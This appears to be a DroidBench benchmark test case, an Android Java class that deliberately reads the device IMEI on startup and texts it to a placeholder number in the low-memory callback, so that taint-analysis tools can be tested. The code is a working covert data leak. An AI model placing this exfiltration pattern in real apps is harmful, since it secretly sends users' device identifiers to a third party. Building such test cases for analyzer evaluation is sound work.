package de.ecspride;

import android.app.Application;
import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name ApplicationLifecycle2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A secret value is obtained on application start and leaked in
 the low memory
 * 	callback.
 * @dataflow source -> onCreate() -> imei -> onLowMemory() -> sink
 * @number_of_leaks 1
 * @challenges Correct handling of callbacks in the Application object
 */
public class ApplicationLifecyle2 extends Application {
    private String imei;
    
    @Override
    public void onCreate() {
        super.onCreate();
        TelephonyManager tm = (TelephonyManager)
                                getSystemService(Context.TELEPHONY_SERVICE);
        imei = tm.getDeviceId();
    }
    
    @Override
    public void onLowMemory() {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null);
    }
    
    public ApplicationLifecyle2() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "P8dG2sUXEwAA");
}
